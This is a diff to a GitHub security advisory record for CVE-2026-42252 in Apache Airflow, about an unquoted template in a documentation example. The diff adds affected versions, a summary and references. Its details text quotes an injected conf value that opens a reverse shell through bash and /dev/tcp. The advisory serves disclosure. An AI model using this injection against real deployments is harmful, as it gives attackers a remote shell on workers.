@@ -1,11 +1,12 @@
 {
   "schema_version": "1.4.0",
   "id": "GHSA-c85c-g9wv-pph2",
-  "modified": "2026-06-02T18:31:27Z",
+  "modified": "2026-07-09T20:52:34Z",
   "published": "2026-06-01T09:31:14Z",
   "aliases": [
     "CVE-2026-42252"
   ],
+  "summary": "Apache Airflow vulnerable to Improper Neutralization of Special Elements Used in a Template Engine",
   "details": "Apache Airflow's official documentation at `core-concepts/dag-run.html` (\"Passing Parameters when triggering Dags\") showed a verbatim `BashOperator(bash_command=\"echo value: {{ dag_run.conf['conf1'] }}\")` example without any quoting / sanitization warning. Dag authors who copied the pattern verbatim into deployments where users had `Dag.can_trigger` permission on the affected Dag (typical multi-team deployments, hosted offerings exposing a trigger API) could be exposed to shell-metacharacter injection via the `conf` field of the trigger API: an authenticated trigger user could supply `\"; bash -i >& /dev/tcp/.../9999 0>&1; #\"` as a `conf` value and reach an `os.exec` on the worker. This CVE covers the documentation correction in `apache/airflow` PR 64129 — the pattern in the docs example now includes explicit shell-quoting and a safety caveat. Affects deployments whose Dag code was modeled on the pre-correction docs example. Same class as the prior CVE-2025-50213 and CVE-2025-27018 documentation-pattern fixes. Users are advised to upgrade to `apache-airflow` 3.2.2 or later to pick up the corrected documentation shipped with the release.",
   "severity": [
     {
@@ -13,7 +14,27 @@
       "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"
     }
   ],
-  "affected": [],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "apache-airflow"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "3.0.0"
+            },
+            {
+              "fixed": "3.2.2"
+            }
+          ]
+        }
+      ]
+    }
+  ],
   "references": [
     {
       "type": "ADVISORY",
@@ -22,6 +43,14 @@
     {
       "type": "WEB",
       "url": "https://github.com/apache/airflow/pull/64129"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/apache/airflow"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/pypa/advisory-database/tree/main/vulns/apache-airflow/PYSEC-2026-184.yaml"
     },
     {
       "type": "WEB",
@@ -33,8 +62,8 @@
       "CWE-1336"
     ],
     "severity": "CRITICAL",
-    "github_reviewed": false,
-    "github_reviewed_at": null,
+    "github_reviewed": true,
+    "github_reviewed_at": "2026-07-09T20:52:34Z",
     "nvd_published_at": "2026-06-01T09:16:18Z"
   }
 }
